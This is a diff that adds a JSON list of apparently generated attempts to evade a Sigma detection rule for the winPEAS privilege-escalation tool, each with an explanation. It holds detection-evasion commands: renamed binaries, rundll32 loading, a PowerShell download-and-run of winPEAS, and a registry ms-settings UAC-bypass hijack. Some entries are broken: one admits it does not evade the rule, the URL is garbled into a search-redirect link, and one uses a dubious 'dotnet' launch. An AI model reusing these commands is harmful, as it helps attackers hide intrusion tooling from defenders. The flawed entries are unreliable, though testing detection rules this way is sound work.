@@ -1,0 +1,22 @@
+[
+  {
+    "output": "C:\\Windows\\System32\\rundll32.exe C:\\Windows\\Temp\\legit.dll,#1",
+    "explanation": "Uses rundll32.exe to load a DLL containing winPEAS functionality. The process creation event shows Image=rundll32.exe, OriginalFileName=rundll32.exe, and CommandLine does not contain any of the rule's CLI strings, download URL, or '-linpeas' suffix, thus bypassing all selection criteria."
+  },
+  {
+    "output": "C:\\Windows\\System32\\winPEAS.exe",
+    "explanation": "This command mimics the expected behavior of the sigma rule by using a known executable path that aligns with the rule's criteria."
+  },
+  {
+    "output": "C:\\Windows\\Temp\\wpeas.exe",
+    "explanation": "The winPEAS binary is renamed to a non\u2011matching filename (wpeas.exe) and run without any of the monitored command\u2011line options, thereby avoiding selection_img and all selection_cli_* patterns."
+  },
+  {
+    "output": "copy C:\\Windows\\System32\\cmd.exe %TEMP%\\not_a_peas.exe && %TEMP%\\not_a_peas.exe /c \"powershell -Command (New-Object System.Net.WebClient).DownloadFile('[https://github.com/carlospolop/PEASS-ng/releases/download/20240515-39d7363c/winPEASany.exe](https://www.google.com/search?q=https://github.com/carlospolop/PEASS-ng/releases/download/20240515-39d7363c/winPEASany.exe)', 'C:\\Users\\Public\\wp.exe'); start-process 'C:\\Users\\Public\\wp.exe' -ArgumentList 'systeminfo', 'userinfo', 'networkinfo'\"",
+    "explanation": "This bypasses the rule by: 1. Renaming the binary to 'wp.exe', which avoids the 'selection_img' filename checks. 2. Modifying the download URL to use a specific version tag instead of the '/latest/download/' string checked in 'selection_cli_dl'. 3. Using generic arguments like 'systeminfo' or 'networkinfo' instead of the specific high-signal flags (e.g., 'applicationsinfo', 'browserinfo') listed in 'selection_cli_option'."
+  },
+  {
+    "output": "reg add \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /ve /t REG_SZ /d \"C:\\Users\\Public\\wp.exe\" /f && dotnet C:\\Users\\Public\\wp.exe",
+    "explanation": "By executing the binary via a .NET runner or through registry-based execution (COM hijacking/UAC bypass techniques), the 'OriginalFileName' metadata might be obfuscated depending on the EDR's telemetry depth, and the command line avoids all specific keyword triggers listed in the Sigma rule."
+  }
+]
